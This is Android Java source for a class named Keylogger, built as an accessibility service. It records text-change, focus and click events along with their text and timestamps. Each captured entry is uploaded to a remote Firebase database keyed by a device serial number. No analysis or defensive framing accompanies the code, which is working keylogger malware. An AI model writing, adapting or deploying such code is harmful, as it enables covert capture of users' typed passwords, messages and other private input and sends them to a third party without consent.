package com.custom.metinatac.customscreen;

import android.accessibilityservice.AccessibilityService;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;

import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;

import java.util.Calendar;
import java.text.SimpleDateFormat;
import java.text.DateFormat;
import java.util.Locale;


/**
 * Created by Brian on 3/10/2017.
 */

public class Keylogger extends AccessibilityService {


    static Key gefundenerKey;



    @Override
    public void onServiceConnected() {
        Log.d("Keylogger", "Starting service");
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {

        DateFormat df = new SimpleDateFormat("MM/dd/yyyy, HH:mm:ss z", Locale.US);
        String time = df.format(Calendar.getInstance().getTime());

        switch(event.getEventType()) {
            case AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED: {
                String data = event.getText().toString();

                if(data.equals("[]")) {



                } else {

                    // Write a message to the database
                    FirebaseDatabase database = FirebaseDatabase.getInstance();
                    DatabaseReference myRef = database.getReference("KeyLogger");


                    myRef = myRef.child(gefundenerKey.getSerialnumber()).child("Eintraege");

                    String id = myRef.push().getKey();
                    Eintrag neuerEintrag = new Eintrag(data, time, id);
                    myRef.child(id).setValue(neuerEintrag);



                }

                break;
            }
           case AccessibilityEvent.TYPE_VIEW_FOCUSED: {
                String data = event.getText().toString();


               if(data.equals("[]")) {



               } else {

                   // Write a message to the database
                   FirebaseDatabase database = FirebaseDatabase.getInstance();
                   DatabaseReference myRef = database.getReference("KeyLogger");


                   myRef = myRef.child(gefundenerKey.getSerialnumber()).child("Eintraege");

                   String id = myRef.push().getKey();
                   Eintrag neuerEintrag = new Eintrag(data, time, id);
                   myRef.child(id).setValue(neuerEintrag);



               }

               break;
            }
            case AccessibilityEvent.TYPE_VIEW_CLICKED: {
                String data = event.getText().toString();

                if(data.equals("[]")) {



                } else {

                    // Write a message to the database
                    FirebaseDatabase database = FirebaseDatabase.getInstance();
                    DatabaseReference myRef = database.getReference("KeyLogger");


                    myRef = myRef.child(gefundenerKey.getSerialnumber()).child("Eintraege");

                    String id = myRef.push().getKey();
                    Eintrag neuerEintrag = new Eintrag(data, time, id);
                    myRef.child(id).setValue(neuerEintrag);



                }

                break;
            }
            default:
                break;
        }
    }

    @Override
    public void onInterrupt() {

    }
}